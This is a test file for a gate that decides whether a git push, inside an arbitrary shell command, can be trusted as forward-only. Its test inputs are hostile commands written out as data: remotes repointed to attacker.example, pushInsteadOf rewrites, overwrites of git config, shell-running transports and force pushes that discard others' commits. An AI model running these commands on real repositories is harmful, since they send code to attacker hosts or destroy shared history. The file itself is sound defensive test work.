import { beforeEach, describe, expect, test } from "bun:test";
import { measureGitPushProvenance, buildJevState } from "../jev.ts";
import { execSync } from "node:child_process";
import { mkdirSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fire, jevSafeAnswer, loadPlugin, makeCtx, makeEvent, makeSettings, removeConfigFile, setJevAnswer, stateOf } from "./fixtures";

// Real git in a temp repo. The runner has no global identity and may default
// to a branch other than main, so pin both, and ignore the host's git config
// (signing, hooks, templates) so the fixture is the same everywhere.
const GIT_ENV = {
	...process.env,
	GIT_CONFIG_GLOBAL: "/dev/null",
	GIT_CONFIG_NOSYSTEM: "1",
	GIT_AUTHOR_NAME: "test",
	GIT_AUTHOR_EMAIL: "test@example.com",
	GIT_COMMITTER_NAME: "test",
	GIT_COMMITTER_EMAIL: "test@example.com",
};
const git = (script: string, cwd: string): void => {
	execSync(script, { cwd, env: GIT_ENV });
};

describe("gate-measured git push provenance (#63)", () => {
	test("a non-push command carries no provenance", () => {
		expect(measureGitPushProvenance("echo hello", "/tmp")).toBeUndefined();
		// A push without a refspec names nothing to measure.
		expect(measureGitPushProvenance("git push origin", "/tmp")).toBeUndefined();
		// Outside a repository no remote is known by name, so nothing is measured.
		expect(measureGitPushProvenance("git push origin main", "/tmp")).toBeUndefined();
	});

	test("push refs parse: remote, local, remote side, plus and flags tolerated", () => {
		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
		try {
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base", dir);
			// A known remote with no tracking ref yet: the parse is visible as null tips.
			const p = measureGitPushProvenance("git push origin feature/some:feature/some --force-with-lease", dir);
			expect(p?.remoteTip).toBeNull();
			expect(p?.ahead).toBeNull();
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("equal tips: forwardOnly true, ahead 0 behind 0", () => {
		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
		try {
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && git branch side && git update-ref refs/remotes/origin/side HEAD", dir);
			const p = measureGitPushProvenance("git push --force-with-lease origin main:side", dir);
			expect(p?.forwardOnly).toBe(true);
			expect(p?.ahead).toBe(0);
			expect(p?.behind).toBe(0);
			// State carries the measured tier with its authority note.
			const state = buildJevState({ command: "git push --force-with-lease origin main:side", workingDirectory: dir, gitPushProvenance: p }) as Record<string, unknown>;
			const prov = state.gitPushProvenance as Record<string, unknown>;
			expect(prov.forwardOnly).toBe(true);
			expect(String(prov.note)).toContain("measured by the gate");
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("a HEAD refspec is measured against the same-named remote branch, not origin/HEAD", () => {
		// `git push origin HEAD` pushes the current branch to the remote branch of
		// the same name. Measured against refs/remotes/origin/HEAD (the default
		// branch) instead, a force push that discards the remote feature branch's
		// own commits read as forward-only whenever the branch contains main.
		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
		try {
			git(
				"git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && " +
					"git update-ref refs/remotes/origin/main HEAD && git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main && " +
					"git switch -q -c feature && git commit -q --allow-empty -m remote-only && git update-ref refs/remotes/origin/feature HEAD && " +
					"git reset -q --hard main && git commit -q --allow-empty -m local-rewrite",
				dir,
			);
			// A leased force push is the only force spelling measured (#169).
			for (const command of ["git push --force-with-lease origin HEAD", "git push -u origin HEAD", "git push --force-with-lease origin @", "git push --force-with-lease=feature origin HEAD"]) {
				const p = measureGitPushProvenance(command, dir);
				expect(p?.forwardOnly, command).toBe(false);
				expect(p?.behind, command).toBe(1);
			}
			// `HEAD:<name>` names its remote side, so only the local side is HEAD.
			const explicit = measureGitPushProvenance("git push --force-with-lease origin HEAD:feature", dir);
			expect(explicit?.behind).toBe(1);
			// `<src>:HEAD` names a destination spelled HEAD: it is not the
			// current-branch shorthand, so the current branch is not swapped in.
			const destination = measureGitPushProvenance("git push --force-with-lease origin main:HEAD", dir);
			expect(destination?.remoteTip).toBe(execSync("git rev-parse refs/remotes/origin/HEAD", { cwd: dir, env: GIT_ENV }).toString().trim());
			// A branch the remote does not have yet: no remote tip, nothing compared.
			git("git switch -q -c brand-new", dir);
			const fresh = measureGitPushProvenance("git push -u origin HEAD", dir);
			expect(fresh?.remoteTip).toBeNull();
			expect(fresh?.forwardOnly).toBeUndefined();
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("an earlier segment that rewrites refs leaves the push unmeasured", () => {
		// The gate measures before the command runs. A segment ahead of the push
		// that rewrites the pushed ref, or moves HEAD under a HEAD refspec, makes
		// the push see refs the measurement never read: forward-only before an
		// amend or a reset says nothing about the force push after it.
		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
		try {
			git(
				"git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && " +
					"git update-ref refs/remotes/origin/main HEAD && git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main && " +
					"git branch b && git update-ref refs/remotes/origin/b HEAD",
				dir,
			);
			for (const command of [
				"git commit --amend --no-edit && git push --force-with-lease origin main",
				"git commit --amen --no-edit && git push --force-with-lease origin main",
				"git branch --forc main HEAD~1 && git push --force-with-lease origin main",
				"git branch -fq main HEAD~1 && git push --force-with-lease origin main",
				"git reset --hard HEAD~1 && git push --force-with-lease origin main",
				"git rebase -i HEAD~2 && git push --force-with-lease origin main",
				"git pull --rebase && git push --force-with-lease origin main",
				"git branch -f main HEAD~1 && git push --force-with-lease origin main",
				"git switch b && git push --force-with-lease origin HEAD",
				"git checkout b && git push --force-with-lease origin HEAD",
				// A global option hides which subcommand runs, and in which repository.
				"git -C . reset --hard HEAD~1 && git push --force-with-lease origin main",
				"git -c user.name=x rebase -i HEAD~2 && git push --force-with-lease origin main",
				// Anything not known to leave refs alone: an alias, a script, an export.
				"git amend && git push --force-with-lease origin main",
				"./rewrite.sh && git push --force-with-lease origin main",
				"export GIT_DIR=/elsewhere/.git; git push --force-with-lease origin main",
				"echo 1111111111111111111111111111111111111111 > .git/refs/heads/main && git push --force-with-lease origin main",
			]) {
				expect(measureGitPushProvenance(command, dir), command).toBeUndefined();
			}
			// Commits, merges and cherry-picks only add descendants of the measured
			// tip, so forward-only still holds after them and the push stays measured.
			expect(measureGitPushProvenance("git commit -q --allow-empty -m next && git push origin main", dir)?.forwardOnly).toBe(true);
			expect(measureGitPushProvenance("git merge -q b && git push origin main", dir)?.forwardOnly).toBe(true);
			expect(measureGitPushProvenance("git add -A && git commit -q --allow-empty -m next && git push origin main", dir)?.forwardOnly).toBe(true);
			// Without force syntax git refuses any non-fast-forward update, so what ran
			// before cannot make the push destructive and it stays measured.
			expect(measureGitPushProvenance("git switch b && git push origin main", dir)?.forwardOnly).toBe(true);
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("a push the parse cannot pin to one ref pair in this repository is not measured", () => {
		// Each of these would have measured the plain `feature:feature` pair as a
		// forward push, while git deletes the remote branch, pushes other refs, or
		// pushes another repository.
		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
		try {
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && git branch feature && git update-ref refs/remotes/origin/feature HEAD", dir);
			for (const measured of ["git push origin feature", "git push -u --force-with-lease origin feature", "git push --force-with-lease=feature origin feature"]) {
				expect(measureGitPushProvenance(measured, dir)?.forwardOnly, measured).toBe(true);
			}
			for (const command of [
				"git push --delete origin feature",
				"git push -d origin feature",
				"git push origin feature --delete",
				"git push -fd origin feature",
				"git push --force-with-lease origin feature main",
				"git push --force-with-lease --tags origin feature",
				"git push --all origin feature",
				"git push --mirror origin feature",
				"git push -o ci.skip origin feature",
				"GIT_DIR=/elsewhere/.git git push --force-with-lease origin feature",
				"git --git-dir=/elsewhere/.git push --force-with-lease origin feature",
				"env GIT_DIR=/elsewhere/.git git push --force-with-lease origin feature",
				"command git push --force-with-lease origin feature",
				// git accepts unambiguous abbreviations of long options.
				"git push --del origin feature",
				"git push --mir origin feature",
				// A word the shell rewrites is not the word git receives.
				"git push origin {feature,+main}",
				"git push origin $SPEC",
				"git push $FLAGS origin feature",
				"git push origin feature*",
			]) {
				expect(measureGitPushProvenance(command, dir), command).toBeUndefined();
			}
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("a neutral subcommand with a flag that writes or rewinds, a fd-less >&, or a substitution inside the push leaves it unmeasured", () => {
		// Review of #168: `log`, `cherry-pick` and `stash` are neutral by name, but
		// `--output` writes a file (a ref file included), `--abort` restores the
		// pre-sequence HEAD, and `stash branch` checks out a new branch. `>&word`
		// with a non-number target is a file redirect, and a substitution inside
		// the push's own words runs before the push does.
		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
		try {
			git(
				"git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && " +
					"git update-ref refs/remotes/origin/main HEAD && git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main",
				dir,
			);
			for (const command of [
				"git log -1 --format=%H --output=.git/refs/heads/main && git push --force-with-lease origin main",
				"git log -1 --outp=.git/refs/heads/main && git push --force-with-lease origin main",
				"git diff --output=.git/refs/heads/main && git push --force-with-lease origin main",
				"git cherry-pick --abort && git push --force-with-lease origin main",
				"git revert --abo && git push --force-with-lease origin main",
				"git merge --abort && git push --force-with-lease origin main",
				"git stash branch tmp && git push --force-with-lease origin HEAD",
				"echo 1111111111111111111111111111111111111111 >& .git/refs/heads/main && git push --force-with-lease origin main",
				"git push origin +$(git reset -q --hard HEAD~1; echo main)",
				"git stash show --output=.git/refs/heads/main && git push --force-with-lease origin main",
				"git branch -D main && git branch main HEAD~1 && git push --force-with-lease origin main",
			]) {
				expect(measureGitPushProvenance(command, dir), command).toBeUndefined();
			}
			for (const command of [
				"git log --oneline -1 && git push origin main",
				"git diff --output-indicator-new=+ && git push origin main",
				"git stash -u && git push origin main",
				"git stash pop && git push origin main",
				"git status 2>&1 && git push origin main",
			]) {
				expect(measureGitPushProvenance(command, dir)?.forwardOnly, command).toBe(true);
			}
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("a force push is measured only as the last segment after plain cd", () => {
		// The parser flattens loops and function bodies, and `&` reads like `;`,
		// so source order is not run order: a reset written after the push can
		// still run before it.
		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
		try {
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && git update-ref refs/remotes/origin/main HEAD", dir);
			for (const command of [
				"for i in 1 2; do git push --force-with-lease origin main; git reset --hard HEAD~1; done",
				"f(){ git push --force-with-lease origin main; }; git reset --hard HEAD~1; f",
				"git push --force-with-lease origin main & git reset --hard HEAD~1",
				"git push --force-with-lease origin main | git reset --hard HEAD~1",
				"( git reset --hard HEAD~1 ); git push --force-with-lease origin main",
				"git push --force-with-lease origin main && gh pr create --fill",
				"git status && git push --force-with-lease origin main",
			]) {
				expect(measureGitPushProvenance(command, dir), command).toBeUndefined();
			}
			expect(measureGitPushProvenance("cd . && git push --force-with-lease origin main", dir)?.forwardOnly).toBe(true);
			expect(measureGitPushProvenance("git push -u origin main && gh pr create --fill", dir)?.forwardOnly).toBe(true);
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("a push after anything that can redefine git or its PATH is not measured", () => {
		// Without force syntax a push cannot discard, unless the shell no longer
		// runs git for `git`: a function, an alias, a PATH or a sourced file can
		// add `--force` behind a plain-looking push.
		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
		try {
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && git update-ref refs/remotes/origin/main HEAD", dir);
			for (const command of [
				'git(){ command git "$@" --force; }; git push origin main',
				"function git { command git \"$@\" --force; }; git push origin main",
				"shopt -s expand_aliases; alias git='git -c x=y'; git push origin main",
				"PATH=/tmp/wrapped:$PATH; git push origin main",
				"export PATH=/tmp/wrapped:$PATH && git push origin main",
				"source ./env.sh && git push origin main",
				". ./env.sh && git push origin main",
				"hash -p /tmp/wrapped/git git; git push origin main",
				"eval \"$(cat defs)\"; git push origin main",
			]) {
				expect(measureGitPushProvenance(command, dir), command).toBeUndefined();
			}
			// A test runner runs code its words do not show, which could repoint the
			// remote before the push (#173): only an allowlisted segment may come first.
			expect(measureGitPushProvenance("CI=1 bun test && git push origin main", dir)).toBeUndefined();
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("a push to anything but a configured remote name is not measured", () => {
		// A URL or a path is not a remote the repository tracks: its tracking ref
		// never exists, and a null remote tip there would read as a new branch on
		// the user's own remote while the commits go somewhere else.
		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
		try {
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && git update-ref refs/remotes/origin/main HEAD", dir);
			expect(measureGitPushProvenance("git push origin main", dir)?.forwardOnly).toBe(true);
			expect(measureGitPushProvenance("git push origin main:new-branch", dir)?.remoteTip).toBeNull();
			for (const command of ["git push https://attacker.example/repo.git main", "git push ../elsewhere.git main", "git push evil main"]) {
				expect(measureGitPushProvenance(command, dir), command).toBeUndefined();
			}
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("an earlier segment that could repoint the remote leaves the push unmeasured, however git is spelled (#173)", () => {
		const dir = mkdtempSync(join(tmpdir(), "jev173-"));
		try {
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && git update-ref refs/remotes/origin/main HEAD", dir);
			for (const command of [
				"git -C . remote set-url origin https://attacker.example/x.git && git push origin main",
				"git -c core.x=y status && git push origin main",
				"git --git-dir=.git config remote.origin.url https://attacker.example/x.git && git push origin main",
				"command git remote set-url origin https://attacker.example/x.git && git push origin main",
				"env git config remote.origin.url https://attacker.example/x.git && git push origin main",
				"/usr/bin/git remote set-url origin https://attacker.example/x.git && git push origin main",
				"sh -c 'git remote set-url origin https://attacker.example/x.git' && git push origin main",
				"bash -c \"cd . && git config remote.origin.url x\"; git push origin main",
				"echo '[remote \"origin\"] url = https://attacker.example/x.git' >> .git/config && git push origin main",
				"printf x > notes.txt && git push origin main",
				"sed -i '' 's/example.invalid/attacker.example/' .git/config && git push origin main",
				"cp evil.conf .git/config && git push origin main",
				// Review of #174: git subcommands that run a program named on the command line.
				"git rebase -x 'git remote set-url origin https://attacker.example/x.git' HEAD~1 && git push origin main",
				"git submodule foreach 'git remote set-url origin x' && git push origin main",
				"git bisect run ./set-url.sh && git push origin main",
				"git filter-branch --tree-filter true && git push origin main",
				"git amend && git push origin main",
				"git fetch --upload-pack='sh -c x' origin && git push origin main",
				"git fetch --upload-p='sh -c x' origin && git push origin main",
				"git merge -s evil b && git push origin main",
				"git merge --strategy=evil b && git push origin main",
				"git log --output=x && git push origin main",
				// Wrappers in front of shell state or git.
				'command eval "git remote set-url origin x" && git push origin main',
				"builtin source ./env.sh && git push origin main",
				"env -i X=1 git remote set-url origin x && git push origin main",
				"env -S 'git remote set-url origin x' && git push origin main",
				"nohup git remote set-url origin x && git push origin main",
				"time git remote set-url origin x && git push origin main",
				"xargs git remote set-url origin < urls && git push origin main",
				"sudo sh -c 'git remote set-url origin x' && git push origin main",
				"env bash -c 'git remote set-url origin x' && git push origin main",
				"python3 -c \"import os; os.system('git remote set-url origin x')\" && git push origin main",
				"node -e \"require('fs').appendFileSync(process.argv[1], 'url = x')\" ./repo-config && git push origin main",
				// Writes to the global or XDG git config, through a program or an environment.
				"tee -a ~/.gitconfig < evil && git push origin main",
				"cp evil ~/.config/git/config && git push origin main",
				"mv evil ~/.gitconfig && git push origin main",
				"install -m 644 evil ~/.gitconfig && git push origin main",
				"ln -sf evil ~/.gitconfig && git push origin main",
				"GIT_CONFIG_GLOBAL=evil git status && git push origin main",
				"GIT_SSH_COMMAND='sh -c x' git fetch && git push origin main",
				// A loop or a background job runs the later words first.
				"for u in x; do git push origin main; git remote set-url origin $u; done",
				"git push origin main & git remote set-url origin x",
				// A pipeline stage after the push runs alongside it.
				"git push origin main | git remote set-url origin x",
				// A substitution in the push's own words runs before it.
				"git push origin $(git remote set-url origin x; echo main)",
				// Review of #174: a word the shell rewrites can become an option or
				// subcommand the allowlist never saw.
				"git rebase $OPT && git push origin main",
				"git commit $(echo -x) && git push origin main",
				"git {rebase,-x,sh} && git push origin main",
				"git log --oneline -1 ${X:---output=.git/config} && git push origin main",
				"git checkout ?ebase && git push origin main",
				"cat <(git remote set-url origin x) && git push origin main",
				// fetch rewrites the tracking refs, and a transport can run a program.
				"git fetch && git push origin main",
				"git fetch 'ext::sh -c x' && git push origin main",
			]) {
				expect(measureGitPushProvenance(command, dir), command).toBeUndefined();
			}
			for (const command of [
				// A function name inside a quoted string is not a function definition.
				'git commit -q --allow-empty -m "fix foo()" && git push origin main',
				"git status 2>&1 && git push origin main",
				"git add -A && git commit -q --allow-empty -m next && git push origin main",
				// Quoted glob and brace characters are text, not expansions.
				'git commit -q --allow-empty -m "fix [P1] {x} *" && git push origin main',
				"git merge --squash -q main && git push origin main",
				"cd . && git log --oneline -1 | head -1 && git push origin main",
				"git push origin main 2>&1 | tail -5",
				// What runs after the push in a plain sequence cannot change it.
				'git push -u origin main && gh pr create --title "fix git push" --body "$(cat body.md)"',
				"git push origin main; CI=1 bun test",
			]) {
				expect(measureGitPushProvenance(command, dir)?.forwardOnly, command).toBe(true);
			}
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("a push is measured only when the remote's one url is where it pushes (#173)", () => {
		const dir = mkdtempSync(join(tmpdir(), "jev173-"));
		try {
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && git update-ref refs/remotes/origin/main HEAD", dir);
			expect(measureGitPushProvenance("git push origin main", dir)?.forwardOnly).toBe(true);
			// Tracking refs alone do not make a remote: git reads `stale` as a path.
			git("git update-ref refs/remotes/stale/main HEAD", dir);
			expect(measureGitPushProvenance("git push stale main", dir)).toBeUndefined();
			// A pushurl sends the push somewhere the tracking refs were not fetched from.
			git("git config remote.origin.pushurl https://attacker.example/x.git", dir);
			expect(measureGitPushProvenance("git push origin main", dir)).toBeUndefined();
			git("git config --unset remote.origin.pushurl", dir);
			// So does any pushInsteadOf rewrite.
			git("git config url.https://attacker.example/.pushInsteadOf https://example.invalid/", dir);
			expect(measureGitPushProvenance("git push origin main", dir)).toBeUndefined();
			git("git config --remove-section url.https://attacker.example/", dir);
			expect(measureGitPushProvenance("git push origin main", dir)?.forwardOnly).toBe(true);
			// A rewrite in the global config counts too: git reads every scope.
			const globalConfig = join(dir, "global.gitconfig");
			git(`git config --file ${JSON.stringify(globalConfig)} url.https://attacker.example/.pushInsteadOf https://example.invalid/`, dir);
			// A child process, because the gate's git calls take this process's
			// environment as it was at startup.
			const measureUnder = (globalPath: string): string =>
				execSync(`bun -e ${JSON.stringify(`import { measureGitPushProvenance } from ${JSON.stringify(join(import.meta.dir, "..", "jev.ts"))}; console.log(JSON.stringify(measureGitPushProvenance("git push origin main", ${JSON.stringify(dir)}) ?? null))`)}`, {
					env: { ...GIT_ENV, GIT_CONFIG_GLOBAL: globalPath },
				})
					.toString()
					.trim();
			expect(measureUnder(globalConfig)).toBe("null");
			expect(JSON.parse(measureUnder("/dev/null"))?.forwardOnly).toBe(true);
			// A second url pushes to both, while `config --get` reports only one.
			git("git remote set-url --add origin https://attacker.example/x.git", dir);
			expect(measureGitPushProvenance("git push origin main", dir)).toBeUndefined();
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("a force push is measured only when a lease on the measured tip is all that forces it (#169)", () => {
		// The gate never fetches. Someone else pushes after the last fetch, so the
		// tracking ref is stale and the local tip looks forward-only against it.
		const dir = mkdtempSync(join(tmpdir(), "jev169-"));
		const origin = join(dir, "origin.git");
		const repo = join(dir, "repo");
		const other = join(dir, "other");
		try {
			git(`git init -q --bare -b main ${JSON.stringify(origin)}`, dir);
			git(`git init -q -b main ${JSON.stringify(repo)}`, dir);
			git(`git remote add origin ${JSON.stringify(origin)} && git commit -q --allow-empty -m base && git push -q origin main`, repo);
			git(`git clone -q ${JSON.stringify(origin)} ${JSON.stringify(other)}`, dir);
			git("git commit -q --allow-empty -m theirs && git push -q origin main", other);
			git("git commit -q --allow-empty -m mine", repo);
			// A lease is measured: git checks the remote still holds the tip the gate read.
			for (const command of ["git push --force-with-lease origin main", "git push --force-with-lease=main origin main", "git push --force-with-lease=refs/heads/main --force-if-includes origin main"]) {
				expect(measureGitPushProvenance(command, repo)?.forwardOnly, command).toBe(true);
			}
			// ...and git refuses that push, so the stale numbers never describe a discard.
			expect(() => git("git push -q --force-with-lease origin main", repo)).toThrow();
			// Every other force spelling pushes past the stale ref, so it is not measured.
			for (const command of [
				"git push --force origin main",
				"git push -f origin main",
				"git push -fu origin main",
				"git push origin +main",
				"git push --force-with-lease origin +main",
				"git push --force-with-lease -f origin main",
				"git push --force-with-lease --force origin main",
				"git push --force-with-lease=main:abc123 origin main",
				"git push --force-with-lease=other origin main",
				"git push --force-with-lease= origin main",
				"git push --force-if-includes origin main",
			]) {
				expect(measureGitPushProvenance(command, repo), command).toBeUndefined();
			}
			// The measurement was right to refuse them: a plain force push discards their commit.
			git("git push -q --force origin main", repo);
			expect(execSync("git log --format=%s main", { cwd: origin, env: GIT_ENV }).toString()).not.toContain("theirs");
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("a bare git push is measured against the destination git resolves for it (#171)", () => {
		const dir = mkdtempSync(join(tmpdir(), "jev171-"));
		const origin = join(dir, "origin.git");
		const repo = join(dir, "repo");
		const other = join(dir, "other");
		try {
			git(`git init -q --bare -b main ${JSON.stringify(origin)}`, dir);
			git(`git init -q -b main ${JSON.stringify(repo)}`, dir);
			git(`git remote add origin ${JSON.stringify(origin)} && git commit -q --allow-empty -m base && git push -q -u origin main`, repo);
			git("git switch -q -c feature && git commit -q --allow-empty -m f1 && git push -q -u origin feature && git commit -q --allow-empty -m f2", repo);
			// The common spelling: the current branch to its upstream.
			for (const command of ["git push", "git push -q", "git add -A && git commit -q --allow-empty -m wip && git push", "git push --force-with-lease"]) {
				expect(measureGitPushProvenance(command, repo), command).toMatchObject({ ahead: 1, behind: 0, forwardOnly: true });
			}
			// upstream mode sends the branch to its upstream even when the names differ.
			git("git switch -q -c renamed && git commit -q --allow-empty -m r1 && git branch -q -u origin/main && git config push.default upstream", repo);
			expect(measureGitPushProvenance("git push", repo)).toMatchObject({ ahead: 3, behind: 0, forwardOnly: true });
			// simple refuses a differently named upstream, and @{push} does too.
			git("git config --unset push.default", repo);
			expect(measureGitPushProvenance("git push", repo)).toBeUndefined();
			git("git switch -q feature", repo);
			// Someone else pushed to the branch, and this repository fetched it.
			git(`git clone -q -b feature ${JSON.stringify(origin)} ${JSON.stringify(other)}`, dir);
			git("git commit -q --allow-empty -m theirs && git push -q origin feature", other);
			git("git fetch -q origin", repo);
			expect(measureGitPushProvenance("git push", repo)).toMatchObject({ ahead: 1, behind: 1, forwardOnly: false });
			git("git reset -q --hard origin/feature && git commit -q --allow-empty -m mine", repo);
			expect(measureGitPushProvenance("git push", repo)?.forwardOnly).toBe(true);
			// Every shape where git would push something else, or the gate cannot tell.
			for (const [setup, undo] of [
				["git config push.default matching", "git config --unset push.default"],
				["git config push.default nothing", "git config --unset push.default"],
				["git config remote.origin.mirror true", "git config --unset remote.origin.mirror"],
				["git config remote.origin.push +refs/heads/*:refs/heads/*", "git config --unset remote.origin.push"],
				["git config branch.feature.pushRemote nosuch", "git config --unset branch.feature.pushRemote"],
				["git config remote.pushDefault nosuch", "git config --unset remote.pushDefault"],
				["git config remote.origin.pushurl https://attacker.example/x.git", "git config --unset remote.origin.pushurl"],
			]) {
				git(setup, repo);
				expect(measureGitPushProvenance("git push", repo), setup).toBeUndefined();
				git(undo, repo);
			}
			expect(measureGitPushProvenance("git push", repo)?.forwardOnly).toBe(true);
			for (const command of [
				// Force without a lease, as for an explicit refspec (#169).
				"git push --force",
				"git push -f",
				// An earlier segment can change which branch is current or where it pushes.
				"git switch main && git push",
				"git checkout main && git push",
				"git branch -u origin/main && git push",
				"git stash branch tmp && git push",
				// One operand is neither a bare push nor a remote and refspec.
				"git push origin",
			]) {
				expect(measureGitPushProvenance(command, repo), command).toBeUndefined();
			}
			// A branch with no upstream under simple: git refuses, @{push} cannot resolve.
			git("git switch -q -c fresh", repo);
			expect(measureGitPushProvenance("git push", repo)).toBeUndefined();
			git("git switch -q --detach", repo);
			expect(measureGitPushProvenance("git push", repo)).toBeUndefined();
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("a HEAD refspec on a detached HEAD names no remote branch, so nothing is measured", () => {
		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
		try {
			git(
				"git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && " +
					"git update-ref refs/remotes/origin/main HEAD && git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main && git switch -q --detach",
				dir,
			);
			expect(measureGitPushProvenance("git push --force-with-lease origin HEAD", dir)).toBeUndefined();
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("diverged tips: behind above zero, forwardOnly false", () => {
		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
		try {
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base", dir);
			// Remote gets its own commit; local gets a different one: a genuine
			// divergence where the push would discard the remote's commit.
			git("git checkout -q --detach HEAD && git commit -q --allow-empty -m remote-only && git update-ref refs/remotes/origin/side HEAD", dir);
			git("git checkout -q main && git commit -q --allow-empty -m local-only", dir);
			const p = measureGitPushProvenance("git push origin main:side", dir);
			expect(p?.behind).toBe(1);
			expect(p?.ahead).toBe(1);
			expect(p?.forwardOnly).toBe(false);
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("a push to a URL, not a remote the repository knows, yields no provenance", () => {
		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
		try {
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base", dir);
			expect(measureGitPushProvenance("git push https://example.com/x.git main:main", dir)).toBeUndefined();
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});

	test("a compound command measures the one push it makes, and nothing when it makes two", () => {
		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
		const origin = join(dir, "origin.git");
		const repo = join(dir, "repo");
		try {
			git(`git init -q --bare -b main ${JSON.stringify(origin)}`, dir);
			git(`git init -q -b main ${JSON.stringify(repo)}`, dir);
			git(`git commit -q --allow-empty -m base && git remote add origin ${JSON.stringify(origin)} && git push -q origin main`, repo);
			// One push in the command: it is the push the record describes.
			const after = measureGitPushProvenance("git stash push -m wip && git push origin main", repo);
			expect(after?.forwardOnly).toBe(true);
			// The separator is a separator: `main;` is not a ref name.
			expect(measureGitPushProvenance("git push origin main; git status", repo)?.forwardOnly).toBe(true);
			// Two pushes name two pairs of refs, and one measurement cannot stand
			// in for both: the force push below would otherwise be judged by the
			// forward-only numbers of the push before it.
			expect(measureGitPushProvenance("git push origin main && git push --force-with-lease origin side", repo)).toBeUndefined();
			expect(measureGitPushProvenance("git push origin main; git push origin main", repo)).toBeUndefined();
		} finally {
			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});
	// Round 3 review, as the neighbouring spelling of the compose `--config`
	// class: `git` runs in the command's OWN segment directory, so a `cd`
	// before the push decides which repository is measured. Reading the
	// session's own repository reported another repo's tips — and its
	// `forwardOnly` — for a push that discards work.
	test("the push is measured in the repository the command's own segment runs in", () => {
		const session = mkdtempSync(join(tmpdir(), "jev63-session-"));
		const target = mkdtempSync(join(tmpdir(), "jev63-target-"));
		try {
			// The session's own repo is a clean fast-forward (ahead 1, behind 0).
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && git update-ref refs/remotes/origin/main HEAD && git commit -q --allow-empty -m local", session);
			// The repo the command cd's into has DIVERGED: the same push there
			// discards a remote commit, which the session's numbers deny.
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && git checkout -q --detach HEAD && git commit -q --allow-empty -m remote-only && git update-ref refs/remotes/origin/main HEAD && git checkout -q main && git commit -q --allow-empty -m local-only", target);
			expect(measureGitPushProvenance("git push origin main", session)?.forwardOnly).toBe(true);
			expect(measureGitPushProvenance(`cd ${target} && git push origin main`, session)).toEqual({
